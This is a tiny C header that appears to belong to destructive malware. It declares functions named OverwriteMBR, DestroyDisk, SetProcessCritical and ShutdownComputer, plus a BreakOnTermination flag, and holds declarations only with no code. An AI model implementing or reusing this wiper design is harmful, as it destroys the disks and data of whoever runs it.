#pragma once
#include "esfera.h"
					
BOOL BreakOnTermination;
BOOL bSafe;

BOOL
WINAPI
OverwriteMBR(
	VOID
);

BOOL
WINAPI
DestroyDisk(
	VOID
);


VOID
WINAPI
ExtraMess(
	VOID
);

BOOL
WINAPI
SetProcessCritical(
	VOID
);

BOOL
WINAPI
ShutdownComputer(
	VOID
);